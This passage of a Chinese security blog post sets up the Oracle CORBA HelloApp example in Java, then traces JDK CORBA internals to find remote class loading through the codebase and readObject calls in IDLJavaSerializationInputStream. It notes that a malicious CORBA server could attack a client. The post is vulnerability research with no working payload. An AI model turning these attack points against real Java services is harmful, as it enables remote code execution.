org.omg.CORBA.portable.ResponseHandler $rh) &#123; org.omg.CORBA.portable.OutputStream out = null; java.lang.Integer __method = (java.lang.Integer)_methods.get ($method); if (__method == null) throw new org.omg.CORBA.BAD_OPERATION (0, org.omg.CORBA.CompletionStatus.COMPLETED_MAYBE); switch (__method.intValue ()) &#123; case 0: // HelloApp/Hello/sayHello &#123; String $result = null; $result = this.sayHello (); out = $rh.createReply(); out.write_string ($result); break; &#125; default: throw new org.omg.CORBA.BAD_OPERATION (0, org.omg.CORBA.CompletionStatus.COMPLETED_MAYBE); &#125; return out; &#125; // _invoke // Type-specific CORBA::Object operations private static String[] __ids = &#123; &quot;IDL:HelloApp/Hello:1.0&quot;&#125;; public String[] _all_interfaces (org.omg.PortableServer.POA poa, byte[] objectId) &#123; return (String[])__ids.clone (); &#125; public Hello _this() &#123; return HelloHelper.narrow( super._this_object()); &#125; public Hello _this(org.omg.CORBA.ORB orb) &#123; return HelloHelper.narrow( super._this_object(orb)); &#125;&#125; // class HelloPOA 一个抽象类，叫做POA，实际是负责服务端处理调用请求的，可以类比为RMI里面的Skel。客户端：HelloHelper 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475abstract public class HelloHelper&#123; private static String _id = &quot;IDL:HelloApp/Hello:1.0&quot;; public static void insert (org.omg.CORBA.Any a, HelloApp.Hello that) &#123; org.omg.CORBA.portable.OutputStream out = a.create_output_stream (); a.type (type ()); write (out, that); a.read_value (out.create_input_stream (), type ()); &#125; public static HelloApp.Hello extract (org.omg.CORBA.Any a) &#123; return read (a.create_input_stream ()); &#125; private static org.omg.CORBA.TypeCode __typeCode = null; synchronized public static org.omg.CORBA.TypeCode type () &#123; if (__typeCode == null) &#123; __typeCode = org.omg.CORBA.ORB.init ().create_interface_tc (HelloApp.HelloHelper.id (), &quot;Hello&quot;); &#125; return __typeCode; &#125; public static String id () &#123; return _id; &#125; public static HelloApp.Hello read (org.omg.CORBA.portable.InputStream istream) &#123; return narrow (istream.read_Object (_HelloStub.class)); &#125; public static void write (org.omg.CORBA.portable.OutputStream ostream, HelloApp.Hello value) &#123; ostream.write_Object ((org.omg.CORBA.Object) value); &#125; public static HelloApp.Hello narrow (org.omg.CORBA.Object obj) &#123; if (obj == null) return null; else if (obj instanceof HelloApp.Hello) return (HelloApp.Hello)obj; else if (!obj._is_a (id ())) throw new org.omg.CORBA.BAD_PARAM (); else &#123; org.omg.CORBA.portable.Delegate delegate = ((org.omg.CORBA.portable.ObjectImpl)obj)._get_delegate (); HelloApp._HelloStub stub = new HelloApp._HelloStub (); stub._set_delegate(delegate); return stub; &#125; &#125; public static HelloApp.Hello unchecked_narrow (org.omg.CORBA.Object obj) &#123; if (obj == null) return null; else if (obj instanceof HelloApp.Hello) return (HelloApp.Hello)obj; else &#123; org.omg.CORBA.portable.Delegate delegate = ((org.omg.CORBA.portable.ObjectImpl)obj)._get_delegate (); HelloApp._HelloStub stub = new HelloApp._HelloStub (); stub._set_delegate(delegate); return stub; &#125; &#125;&#125; 辅助类，处理编码解码。HelloHolder 1234567891011121314151617181920212223242526272829public final class HelloHolder implements org.omg.CORBA.portable.Streamable&#123; public HelloApp.Hello value = null; public HelloHolder () &#123; &#125; public HelloHolder (HelloApp.Hello initialValue) &#123; value = initialValue; &#125; public void _read (org.omg.CORBA.portable.InputStream i) &#123; value = HelloApp.HelloHelper.read (i); &#125; public void _write (org.omg.CORBA.portable.OutputStream o) &#123; HelloApp.HelloHelper.write (o, value); &#125; public org.omg.CORBA.TypeCode _type () &#123; return HelloApp.HelloHelper.type (); &#125;&#125; 也是一个辅助类，处理参数的。_HelloStub 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859public class _HelloStub extends org.omg.CORBA.portable.ObjectImpl implements HelloApp.Hello&#123; public String sayHello () &#123; org.omg.CORBA.portable.InputStream $in = null; try &#123; org.omg.CORBA.portable.OutputStream $out = _request (&quot;sayHello&quot;, true); $in = _invoke ($out); String $result = $in.read_string (); return $result; &#125; catch (org.omg.CORBA.portable.ApplicationException $ex) &#123; $in = $ex.getInputStream (); String _id = $ex.getId (); throw new org.omg.CORBA.MARSHAL (_id); &#125; catch (org.omg.CORBA.portable.RemarshalException $rm) &#123; return sayHello ( ); &#125; finally &#123; _releaseReply ($in); &#125; &#125; // sayHello // Type-specific CORBA::Object operations private static String[] __ids = &#123; &quot;IDL:HelloApp/Hello:1.0&quot;&#125;; public String[] _ids () &#123; return (String[])__ids.clone (); &#125; private void readObject (java.io.ObjectInputStream s) throws java.io.IOException &#123; String str = s.readUTF (); String[] args = null; java.util.Properties props = null; org.omg.CORBA.ORB orb = org.omg.CORBA.ORB.init (args, props); try &#123; org.omg.CORBA.Object obj = orb.string_to_object (str); org.omg.CORBA.portable.Delegate delegate = ((org.omg.CORBA.portable.ObjectImpl) obj)._get_delegate (); _set_delegate (delegate); &#125; finally &#123; orb.destroy() ; &#125; &#125; private void writeObject (java.io.ObjectOutputStream s) throws java.io.IOException &#123; String[] args = null; java.util.Properties props = null; org.omg.CORBA.ORB orb = org.omg.CORBA.ORB.init (args, props); try &#123; String str = orb.object_to_string (this); s.writeUTF (str); &#125; finally &#123; orb.destroy() ; &#125; &#125;&#125; // class _HelloStub 看名字也知道了，客户端处理远程调用的代理，类比RMI中的stub。有了这些自动生成的类以后，当然还要写自己的逻辑。和RMI类似CORBA也分为三部分：客户端、服务端、Naming Service。Naming Service和注册中心差不多，服务端把对象绑定上去，客户端去查询。因为CORBA是跨语言的，所以Naming Service不是用Java代码开启的，也是一个内置工具： 1orbd -ORBInitialPort 1050 -ORBInitialHost localhost 然后创建服务端，做两件事：实例化Hello接口，绑定到Naming ServiceCORBAServer，来自官网示例https://docs.oracle.com/javase/8/docs/technotes/guides/idl/jidlExample.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263class HelloImpl extends HelloPOA &#123; private ORB orb; public void setORB(ORB orb_val) &#123; orb = orb_val; &#125; // implement sayHello() method public String sayHello() &#123; return &quot;\\nHello world !!\\n&quot;; &#125;&#125;public class CORBAServer &#123; public static void main(String args[]) &#123; try&#123; Properties properties = new Properties(); properties.put(&quot;org.omg.CORBA.ORBInitialHost&quot;,&quot;127.0.0.1&quot;); properties.put(&quot;org.omg.CORBA.ORBInitialPort&quot;,&quot;1050&quot;); // create and initialize the ORB ORB orb = ORB.init(args, properties); // get reference to rootpoa &amp; activate the POAManager POA rootpoa = POAHelper.narrow(orb.resolve_initial_references(&quot;RootPOA&quot;)); rootpoa.the_POAManager().activate(); // create servant and register it with the ORB HelloImpl helloImpl = new HelloImpl(); helloImpl.setORB(orb); // get object reference from the servant org.omg.CORBA.Object ref = rootpoa.servant_to_reference(helloImpl); Hello href = HelloHelper.narrow(ref); // get the root naming context // NameService invokes the name service org.omg.CORBA.Object objRef = orb.resolve_initial_references(&quot;NameService&quot;); // Use NamingContextExt which is part of the Interoperable // Naming Service (INS) specification. NamingContextExt ncRef = NamingContextExtHelper.narrow(objRef); // bind the Object Reference in Naming String name = &quot;Hello&quot;; NameComponent path[] = ncRef.to_name( name ); ncRef.rebind(path, href); System.out.println(&quot;HelloServer ready and waiting ...&quot;); // wait for invocations from clients orb.run(); &#125; catch (Exception e) &#123; System.err.println(&quot;ERROR: &quot; + e); e.printStackTrace(System.out); &#125; System.out.println(&quot;HelloServer Exiting ...&quot;); &#125;&#125; 然后是客户端，获取stub，对stub调用远程方法，就照着RMI理解就行了 1234567891011121314151617181920212223242526272829303132public class CORBAClient &#123; static Hello helloImpl; public static void main(String args[]) &#123; try&#123; Properties properties = new Properties(); properties.put(&quot;org.omg.CORBA.ORBInitialHost&quot;,&quot;127.0.0.1&quot;); properties.put(&quot;org.omg.CORBA.ORBInitialPort&quot;,&quot;1050&quot;); // create and initialize the ORB ORB orb = ORB.init(args, properties); // get the root naming context org.omg.CORBA.Object objRef = orb.resolve_initial_references(&quot;NameService&quot;); // Use NamingContextExt instead of NamingContext. This is // part of the Interoperable naming Service. NamingContextExt ncRef = NamingContextExtHelper.narrow(objRef); // resolve the Object Reference in Naming String name = &quot;Hello&quot;; helloImpl = HelloHelper.narrow(ncRef.resolve_str(name)); System.out.println(&quot;Obtained a handle on server object: &quot; + helloImpl); System.out.println(helloImpl.sayHello()); &#125; catch (Exception e) &#123; System.out.println(&quot;ERROR : &quot; + e) ; e.printStackTrace(System.out); &#125; &#125;&#125; 运行后客户端成功打印出Hello World。实际上服务端也调用了，可以自己sout一下。总体来说和RMI很像，但是多了一步ORB的操作。RMI是getRegistry直接获创建注册中心Stub的，CORBA是创建一个ORB，用ORB获取Naming Service，再在Naming Service上面操作。直觉上这个过程和RMI一样可能出现两种漏洞：1、反序列化2、动态类加载分析一下调用流程，看看有没有存在风险的地方。由于代码实在很乱，所以直接在com.sun.corba.se包里所有调用readObject的点下断点了，省的遗漏。先看服务端，大概做了几件事：1、用ORB从Naming Service获取RootPOA。2、用RootPOA将远程对象转化为stub3、用ORB从Naming Service获取命名上下文NameService4、绑定stub到NameService5、开启监听可以看到中间和Naming Service是有多次交互的，有可能有反序列化的问题。调试跟一下： 服务端调用流程在ORB从Naming Service解析引用名时会调用ORBImpl#resolve_initial_references 12345678910111213141516171819public org.omg.CORBA.Object resolve_initial_references( String identifier) throws InvalidName&#123; Resolver res ; synchronized( this ) &#123; checkShutdownState(); res = resolver ; &#125; synchronized (resolverLock) &#123; org.omg.CORBA.Object result = res.resolve( identifier ) ; if (result == null) throw new InvalidName() ; else return result ; &#125;&#125; 到CompositeResolverImpl#resolve 1234567public org.omg.CORBA.Object resolve( String name )&#123; org.omg.CORBA.Object result = first.resolve( name ) ; if (result == null) result = second.resolve( name ) ; return result ;&#125; 具体不分析了，第二次请求NamingService时会到BootstrapResolverImpl#resolve 123456789101112131415161718public org.omg.CORBA.Object resolve( String identifier )&#123; InputStream inStream = null ; org.omg.CORBA.Object result = null ; try &#123; inStream = invoke( &quot;get&quot;, identifier ) ; result = inStream.read_Object(); // NOTE: do note trap and ignore errors. // Let them flow out. &#125; finally &#123; bootstrapDelegate.releaseReply( null, inStream ) ; &#125; return result ;&#125; 对输入流调用read_Object，这里有好几层，最后到CDRInputStream_1_0#read_Object 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// ------------ RMI related methods --------------------------// IDL to Java ptc-00-01-08 1.21.4.1//// The clz argument to read_Object can be either a stub// Class or the &quot;Class object for the RMI/IDL interface type// that is statically expected.&quot;// This functions as follows:// 1. If clz==null, just use the repository ID from the stub// 2. If clz is a stub class, just use it as a static factory.// clz is a stub class iff StubAdapter.isStubClass( clz ).// In addition, clz is a IDL stub class iff// IDLEntity.class.isAssignableFrom( clz ).// 3. If clz is an interface, use it to create the appropriate// stub factory.public org.omg.CORBA.Object read_Object(Class clz)&#123; // In any case, we must first read the IOR. IOR ior = IORFactories.makeIOR(parent) ; if (ior.isNil()) return null ; PresentationManager.StubFactoryFactory sff = ORB.getStubFactoryFactory() ; String codeBase = ior.getProfile().getCodebase() ; PresentationManager.StubFactory stubFactory = null ; if (clz == null) &#123; RepositoryId rid = RepositoryId.cache.getId( ior.getTypeId() ) ; String className = rid.getClassName() ; boolean isIDLInterface = rid.isIDLType() ; if (className == null || className.equals( &quot;&quot; )) stubFactory = null ; else try &#123; stubFactory = sff.createStubFactory( className, isIDLInterface, codeBase, (Class)null, (ClassLoader)null ); &#125; catch (Exception exc) &#123; // Could not create stubFactory, so use null. // XXX stubFactory handling is still too complex: // Can we resolve the stubFactory question once in // a single place? stubFactory = null ; &#125; &#125; else if (StubAdapter.isStubClass( clz )) &#123; stubFactory = PresentationDefaults.makeStaticStubFactory( clz ) ; &#125; else &#123; // clz is an interface class boolean isIDL = IDLEntity.class.isAssignableFrom( clz ) ; stubFactory = sff.createStubFactory( clz.getName(), isIDL, codeBase, clz, clz.getClassLoader() ) ; &#125; return internalIORToObject( ior, stubFactory, orb ) ;&#125; 默认进clz==null的分支，注意到获取了codebase，那就看看有没有远程加载。来到StubFactoryFactoryStaticImpl#createStubFactory 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172public PresentationManager.StubFactory createStubFactory( String className, boolean isIDLStub, String remoteCodeBase, Class expectedClass, ClassLoader classLoader)&#123; String stubName = null ; if (isIDLStub) stubName = Utility.idlStubName( className ) ; else stubName = Utility.stubNameForCompiler( className ) ; ClassLoader expectedTypeClassLoader = (expectedClass == null ? classLoader : expectedClass.getClassLoader()); // The old code was optimized to try to guess which way to load classes // first. The real stub class name could either be className or // &quot;org.omg.stub.&quot; + className. We will compute this as follows: // If stubName starts with a &quot;forbidden&quot; package, try the prefixed // version first, otherwise try the non-prefixed version first. // In any case, try both forms if necessary. String firstStubName = stubName ; String secondStubName = stubName ; if (PackagePrefixChecker.hasOffendingPrefix(stubName)) firstStubName = PackagePrefixChecker.packagePrefix() + stubName ; else secondStubName = PackagePrefixChecker.packagePrefix() + stubName ; Class clz = null; try &#123; clz = Util.loadClass( firstStubName, remoteCodeBase, expectedTypeClassLoader ) ; &#125; catch (ClassNotFoundException e1) &#123; // log only at FINE level wrapper.classNotFound1( CompletionStatus.COMPLETED_MAYBE, e1, firstStubName ) ; try &#123; clz = Util.loadClass( secondStubName, remoteCodeBase, expectedTypeClassLoader ) ; &#125; catch (ClassNotFoundException e2) &#123; throw wrapper.classNotFound2( CompletionStatus.COMPLETED_MAYBE, e2, secondStubName ) ; &#125; &#125; // XXX Is this step necessary, or should the Util.loadClass // algorithm always produce a valid class if the setup is correct? // Does the OMG standard algorithm need to be changed to include // this step? if ((clz == null) || ((expectedClass != null) &amp;&amp; !expectedClass.isAssignableFrom(clz))) &#123; try &#123; ClassLoader cl = Thread.currentThread().getContextClassLoader(); if (cl == null) cl = ClassLoader.getSystemClassLoader(); clz = cl.loadClass(className); &#125; catch (Exception exc) &#123; // XXX make this a system exception IllegalStateException ise = new IllegalStateException( &quot;Could not load class &quot; + stubName ) ; ise.initCause( exc ) ; throw ise ; &#125; &#125; return new StubFactoryStaticImpl( clz ) ;&#125; 全是函数，这代码看着真累。来到javax.rmi.CORBA.Util#loadClass 123456789101112131415161718192021222324252627282930313233343536/** * Returns a class instance for the specified class. * &lt;P&gt;The spec for this method is the &quot;Java to IDL language * mapping&quot;, ptc/00-01-06. * &lt;P&gt;In Java SE Platform, this method works as follows: * &lt;UL&gt;&lt;LI&gt;Find the first non-null &lt;tt&gt;ClassLoader&lt;/tt&gt; on the * call stack and attempt to load the class using this * &lt;tt&gt;ClassLoader&lt;/tt&gt;. * &lt;LI&gt;If the first step fails, and if &lt;tt&gt;remoteCodebase&lt;/tt&gt; * is non-null and * &lt;tt&gt;useCodebaseOnly&lt;/tt&gt; is false, then call * &lt;tt&gt;java.rmi.server.RMIClassLoader.loadClass(remoteCodebase, className)&lt;/tt&gt;. * &lt;LI&gt;If &lt;tt&gt;remoteCodebase&lt;/tt&gt; is null or &lt;tt&gt;useCodebaseOnly&lt;/tt&gt; * is true, then call &lt;tt&gt;java.rmi.server.RMIClassLoader.loadClass(className)&lt;/tt&gt;. * &lt;LI&gt;If a class was not successfully loaded by step 1, 2, or 3, * and &lt;tt&gt;loader&lt;/tt&gt; is non-null, then call &lt;tt&gt;loader.loadClass(className)&lt;/tt&gt;. * &lt;LI&gt;If a class was successfully loaded by step 1, 2, 3, or 4, then * return the loaded class, else throw &lt;tt&gt;ClassNotFoundException&lt;/tt&gt;. * @param className the name of the class. * @param remoteCodebase a space-separated list of URLs at which * the class might be found. May be null. * @param loader a &lt;tt&gt;ClassLoader&lt;/tt&gt; that may be used to * load the class if all other methods fail. * @return the &lt;code&gt;Class&lt;/code&gt; object representing the loaded class. * @exception ClassNotFoundException if class cannot be loaded. */public static Class loadClass(String className, String remoteCodebase, ClassLoader loader) throws ClassNotFoundException &#123; if (utilDelegate != null) &#123; return utilDelegate.loadClass(className,remoteCodebase,loader); &#125; return null ;&#125; 从注释里看到实际上是支持远程加载的，但是需要useCodebaseOnly为false。最后到JDKBridge#loadClassM 12345678910111213141516171819202122private static Class loadClassM (String className, String remoteCodebase, boolean useCodebaseOnly) throws ClassNotFoundException &#123; try &#123; return JDKClassLoader.loadClass(null,className); &#125; catch (ClassNotFoundException e) &#123;&#125; try &#123; if (!useCodebaseOnly &amp;&amp; remoteCodebase != null) &#123; return RMIClassLoader.loadClass(remoteCodebase, className); &#125; else &#123; return RMIClassLoader.loadClass(className); &#125; &#125; catch (MalformedURLException e) &#123; className = className + &quot;: &quot; + e.toString(); &#125; throw new ClassNotFoundException(className);&#125; 如果useCodebaseOnly为false并且codebase不是空，会调用RMIClassLoader.loadClass。但实际上即使满足这两个条件，真正想用RMI进行远程类加载还需要允许配置SecurityManager。如果能本地加载最后就是调JDKClassLoader.loadClass，最后用Class.forName加载，后面进行了实例化，但实际上forName会触发初始化，不管是否实例化都已经能执行代码了。当前就是本地加载了org.omg.CosNaming._NamingContextStub类，这个类其实相当于RMI中的RegistryImpl_Stub，获取到这个stub后调用了两次，先看第一处_NamingContextStub#to_name 123456789101112131415161718192021222324252627282930313233 /*** This operation converts a Stringified Name into an equivalent array* of Name Components. * * @param sn Stringified Name of the object &lt;p&gt;* * @exception org.omg.CosNaming.NamingContextExtPackage.InvalidName* Indicates the name does not identify a binding.&lt;p&gt;* */ public org.omg.CosNaming.NameComponent[] to_name (String sn) throws org.omg.CosNaming.NamingContextPackage.InvalidName &#123; org.omg.CORBA.portable.InputStream $in = null; try &#123; org.omg.CORBA.portable.OutputStream $out = _request (&quot;to_name&quot;, true); org.omg.CosNaming.NamingContextExtPackage.StringNameHelper.write ($out, sn); $in = _invoke ($out); org.omg.CosNaming.NameComponent $result[] = org.omg.CosNaming.NameHelper.read ($in); return $result; &#125; catch (org.omg.CORBA.portable.ApplicationException $ex) &#123; $in = $ex.getInputStream (); String _id = $ex.getId (); if (_id.equals (&quot;IDL:omg.org/CosNaming/NamingContext/InvalidName:1.0&quot;)) throw org.omg.CosNaming.NamingContextPackage.InvalidNameHelper.read ($in); else throw new org.omg.CORBA.MARSHAL (_id); &#125; catch (org.omg.CORBA.portable.RemarshalException $rm) &#123; return to_name (sn ); &#125; finally &#123; _releaseReply ($in); &#125; &#125; // to_name 大致是创建输出流，写一个字符串，调用连接，然后接收了返回值。这不就是RMI里的newCall+invoke+反序列化吗。和RMI不同，这个_invoke里没看到反序列化的地方。看看接收返回值的函数NameHelper#read 123456789public static org.omg.CosNaming.NameComponent[] read (org.omg.CORBA.portable.InputStream istream)&#123; org.omg.CosNaming.NameComponent value[] = null; int _len0 = istream.read_long (); value = new org.omg.CosNaming.NameComponent[_len0]; for (int _o1 = 0;_o1 &lt; value.length; ++_o1) value[_o1] = org.omg.CosNaming.NameComponentHelper.read (istream); return value;&#125; NameComponentHelper#read 1234567public static org.omg.CosNaming.NameComponent read (org.omg.CORBA.portable.InputStream istream)&#123; org.omg.CosNaming.NameComponent value = new org.omg.CosNaming.NameComponent (); value.id = istream.read_string (); value.kind = istream.read_string (); return value;&#125; 跟进去发现这两个read_string不是用反序列化实现的，而是创建了字符串，直接赋值网络流里读取的字符。catch块里的InvalidNameHelper.read也是一样的。意外的比RMI安全。那么看下一处交互，绑定的地方_NamingContextExtStub#rebind 123456789101112131415161718192021222324252627public void rebind (org.omg.CosNaming.NameComponent[] n, org.omg.CORBA.Object obj) throws org.omg.CosNaming.NamingContextPackage.NotFound, org.omg.CosNaming.NamingContextPackage.CannotProceed, org.omg.CosNaming.NamingContextPackage.InvalidName&#123; org.omg.CORBA.portable.InputStream $in = null; try &#123; org.omg.CORBA.portable.OutputStream $out = _request (&quot;rebind&quot;, true); org.omg.CosNaming.NameHelper.write ($out, n); org.omg.CORBA.ObjectHelper.write ($out, obj); $in = _invoke ($out); return; &#125; catch (org.omg.CORBA.portable.ApplicationException $ex) &#123; $in = $ex.getInputStream (); String _id = $ex.getId (); if (_id.equals (&quot;IDL:omg.org/CosNaming/NamingContext/NotFound:1.0&quot;)) throw org.omg.CosNaming.NamingContextPackage.NotFoundHelper.read ($in); else if (_id.equals (&quot;IDL:omg.org/CosNaming/NamingContext/CannotProceed:1.0&quot;)) throw org.omg.CosNaming.NamingContextPackage.CannotProceedHelper.read ($in); else if (_id.equals (&quot;IDL:omg.org/CosNaming/NamingContext/InvalidName:1.0&quot;)) throw org.omg.CosNaming.NamingContextPackage.InvalidNameHelper.read ($in); else throw new org.omg.CORBA.MARSHAL (_id); &#125; catch (org.omg.CORBA.portable.RemarshalException $rm) &#123; rebind (n, obj ); &#125; finally &#123; _releaseReply ($in); &#125;&#125; // rebind 简单跟了下，没发现可控的反序列化点，catch里有一处调用了read_object但是参数不可控。那么服务端绑定过程没有触发反序列化的点，有触发远程类加载的点。 客户端调用流程(客户端)接下来看客户端调用的过程前面和Naming Service交互的部分和服务端是一样的，看获取远程对象stub的部分：_NamingContextExtStub#resolve_str 123456789101112131415161718192021222324252627public org.omg.CORBA.Object resolve_str (String sn) throws org.omg.CosNaming.NamingContextPackage.NotFound, org.omg.CosNaming.NamingContextPackage.CannotProceed, org.omg.CosNaming.NamingContextPackage.InvalidName&#123; org.omg.CORBA.portable.InputStream $in = null; try &#123; org.omg.CORBA.portable.OutputStream $out = _request (&quot;resolve_str&quot;, true); org.omg.CosNaming.NamingContextExtPackage.StringNameHelper.write ($out, sn); $in = _invoke ($out); org.omg.CORBA.Object $result = org.omg.CORBA.ObjectHelper.read ($in); return $result; &#125; catch (org.omg.CORBA.portable.ApplicationException $ex) &#123; $in = $ex.getInputStream (); String _id = $ex.getId (); if (_id.equals (&quot;IDL:omg.org/CosNaming/NamingContext/NotFound:1.0&quot;)) throw org.omg.CosNaming.NamingContextPackage.NotFoundHelper.read ($in); else if (_id.equals (&quot;IDL:omg.org/CosNaming/NamingContext/CannotProceed:1.0&quot;)) throw org.omg.CosNaming.NamingContextPackage.CannotProceedHelper.read ($in); else if (_id.equals (&quot;IDL:omg.org/CosNaming/NamingContext/InvalidName:1.0&quot;)) throw org.omg.CosNaming.NamingContextPackage.InvalidNameHelper.read ($in); else throw new org.omg.CORBA.MARSHAL (_id); &#125; catch (org.omg.CORBA.portable.RemarshalException $rm) &#123; return resolve_str (sn ); &#125; finally &#123; _releaseReply ($in); &#125;&#125; // resolve_str 和前面不同的是调用了ObjectHelper#read 1234public static org.omg.CORBA.Object read (org.omg.CORBA.portable.InputStream istream)&#123; return istream.read_Object ();&#125; 和前面的类似，最后也是来到CDRInputStream_1_0#read_object，那么这里也是一个动态类加载点。获取到的是远程对象代理_HelloStub，和RMI用反序列化的方式获取stub不同，CORBA是直接进行类加载，客户端本来是有这个类的定义的，同时也支持远程类加载。看客户端调用远程方法的部分，也就是helloImpl.sayHello这里，调用到_HelloStub#sayHello 123456789101112131415161718public String sayHello ()&#123; org.omg.CORBA.portable.InputStream $in = null; try &#123; org.omg.CORBA.portable.OutputStream $out = _request (&quot;sayHello&quot;, true); $in = _invoke ($out); String $result = $in.read_string (); return $result; &#125; catch (org.omg.CORBA.portable.ApplicationException $ex) &#123; $in = $ex.getInputStream (); String _id = $ex.getId (); throw new org.omg.CORBA.MARSHAL (_id); &#125; catch (org.omg.CORBA.portable.RemarshalException $rm) &#123; return sayHello ( ); &#125; finally &#123; _releaseReply ($in); &#125;&#125; // sayHello 这里接收调用结果时使用的read_string是安全的方法，但这时会想到如果返回值是Object的呢？或者如果有参数，又是怎么进行传递的呢？CORBA的idl里，参数类型不是Java的类型，而是in、out、inout这三种，比如这样： 1234567module HelloApp2&#123; interface Hello &#123; Object sayHello(in Object obj,in wstring str2); &#125;;&#125;; 在ibm的文档里的IDL数据类型里没看到支持Object类型，但是好像也能正常用。重新看一下这个Hello接口的调用流程，_HelloStub#sayHello 123456789101112131415161718192021public org.omg.CORBA.Object sayHello (org.omg.CORBA.Object obj, String str2)&#123; org.omg.CORBA.portable.InputStream $in = null; try &#123; org.omg.CORBA.portable.OutputStream $out = _request (&quot;sayHello&quot;, true); org.omg.CORBA.ObjectHelper.write ($out, obj); $out.write_wstring (str2); $in = _invoke ($out); org.omg.CORBA.Object $result = org.omg.CORBA.ObjectHelper.read ($in); return $result; &#125; catch (org.omg.CORBA.portable.ApplicationException $ex) &#123; $in = $ex.getInputStream (); String _id = $ex.getId (); throw new org.omg.CORBA.MARSHAL (_id); &#125; catch (org.omg.CORBA.portable.RemarshalException $rm) &#123; return sayHello (obj, str2 ); &#125; finally &#123; _releaseReply ($in); &#125;&#125; // sayHello 此时的$result已经变成用ObjectHelper.read来获取了，这个函数前面分析过是存在动态类加载问题的。也就是说CORBA的客户端调用时，如果返回值是Object就会产生风险。别的类型是否有危险可能需要针对的去看，这里重载的方法太多了。分析完了对返回值的处理，最后看看服务端对参数的处理。 客户端调用流程(服务端)断点下在HelloPOA里，相当于RMI中的Skel 1234567891011121314151617181920212223242526272829public org.omg.CORBA.portable.OutputStream _invoke (String $method, org.omg.CORBA.portable.InputStream in, org.omg.CORBA.portable.ResponseHandler $rh)&#123; org.omg.CORBA.portable.OutputStream out = null; java.lang.Integer __method = (java.lang.Integer)_methods.get ($method); if (__method == null) throw new org.omg.CORBA.BAD_OPERATION (0, org.omg.CORBA.CompletionStatus.COMPLETED_MAYBE); switch (__method.intValue ()) &#123; case 0: // HelloApp2/Hello/sayHello &#123; org.omg.CORBA.Object obj = org.omg.CORBA.ObjectHelper.read (in); String str2 = in.read_wstring (); org.omg.CORBA.Object $result = null; $result = this.sayHello (obj, str2); out = $rh.createReply(); org.omg.CORBA.ObjectHelper.write (out, $result); break; &#125; default: throw new org.omg.CORBA.BAD_OPERATION (0, org.omg.CORBA.CompletionStatus.COMPLETED_MAYBE); &#125; return out;&#125; // _invoke 可以看到有两个读取参数的操作，第一个已经见过好几回了，看下read_wstring这个函数，最后走到CDRInputStream_1_2#read_wstring 123456789101112131415161718192021public String read_wstring() &#123; // In GIOP 1.2, wstrings are not terminated by a null. The // length is the number of octets in the converted format. // A zero length string is represented with the 4 byte length // value of 0. int len = read_long(); // // IMPORTANT: Do not replace &#x27;new String(&quot;&quot;)&#x27; with &quot;&quot;, it may result // in a Serialization bug (See serialization.zerolengthstring) and // bug id: 4728756 for details if (len == 0) return new String(&quot;&quot;); checkForNegativeLength(len); return new String(getConvertedChars(len, getWCharConverter()), 0, getWCharConverter().getNumChars());&#125; 是没有问题的。这里实际上是根据不同的参数类型来调用不同的read_*方法，那干脆搜索一下到底有没有哪中参数类型是会调用反序列化处理的。最后找到了两处，都在IDLJavaSerializationInputStream里面： 12345678910111213141516171819202122232425262728293031323334353637public String read_wstring() &#123; if (!markOn &amp;&amp; !(markedItemQ.isEmpty())) &#123; // dequeue return (String) markedItemQ.removeFirst(); &#125; if (markOn &amp;&amp; !(markedItemQ.isEmpty()) &amp;&amp; (peekIndex &lt; peekCount)) &#123; // peek return (String) markedItemQ.get(peekIndex++); &#125; try &#123; String value = (String) is.readObject(); if (markOn) &#123; // enqueue markedItemQ.addLast(value); &#125; return value; &#125; catch (Exception e) &#123; throw wrapper.javaSerializationException(e, &quot;read_wstring&quot;); &#125;&#125;public java.io.Serializable read_value() &#123; if (!markOn &amp;&amp; !(markedItemQ.isEmpty())) &#123; // dequeue return (Serializable) markedItemQ.removeFirst(); &#125; if (markOn &amp;&amp; !(markedItemQ.isEmpty()) &amp;&amp; (peekIndex &lt; peekCount)) &#123; // peek return (Serializable) markedItemQ.get(peekIndex++); &#125; try &#123; Serializable value = (java.io.Serializable) is.readObject(); if (markOn) &#123; // enqueue markedItemQ.addLast(value); &#125; return value; &#125; catch (Exception e) &#123; throw wrapper.javaSerializationException(e, &quot;read_value&quot;); &#125;&#125; 这是另一个InputStream，前面一直用的都是CDRInputStream。那么如果能想办法把调用流程切换到这个IDLJavaSerializationInputStream里面，在读取特定数据类型时就有机会触发反序列化漏洞。这个输入流实际上是根据服务端返回的标记为来决定的，也就是恶意CORBA服务端可以攻击CORBA客户端。但实际上，这种原生CORBA实在是太少见了，基本不会有这个攻击场景。Java中使用CORBA更常用的是RMI+IIOP的方式，具体的实现是结合JNDI，在JNDI那篇文章详细介绍。 参考链接https://docs.oracle.com/javase/8/docs/technotes/guides/idl/jidlExample.htmlhttps://docs.oracle.com/javase/7/docs/technotes/guides/rmi-iiop/rmi_iiop_pg.html","categories":[],"tags":[]},{"title":"RMI反序列化漏洞之三顾茅庐-JEP290绕过","slug":"RMI反序列化漏洞之三顾茅庐-JEP290绕过","date":"2021-11-03T11:05:09.000Z","updated":"2021-11-18T11:51:35.239Z","comments":true,"path":"2021/11/03/RMI反序列化漏洞之三顾茅庐-JEP290绕过/","link":"","permalink":"http://yoursite.com/2021/11/03/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-JEP290%E7%BB%95%E8%BF%87/","excerpt":"前面总结了几种针对RMI的攻击方式，包括以下几种：客户端攻击注册中心服务端攻击注册中心注册中心攻击客户端服务端攻击客户端客户端攻击服务端DGC客户端攻击DGC服务端DGC服务端攻击DGC客户端JRMP服务端攻击JRMP客户端但是在jdk8u121之后，java引入了新的安全机制JEP290，这篇文章分析下该机制对RMI相关攻击的影响以及后续的绕过方法","text":"前面总结了几种针对RMI的攻击方式，包括以下几种：客户端攻击注册中心服务端攻击注册中心注册中心攻击客户端服务端攻击客户端客户端攻击服务端DGC客户端攻击DGC服务端DGC服务端攻击DGC客户端JRMP服务端攻击JRMP客户端但是在jdk8u121之后，java引入了新的安全机制JEP290，这篇文章分析下该机制对RMI相关攻击的影响以及后续的绕过方法在8u121之后，RMI做了很多安全修复，这里列举一下以及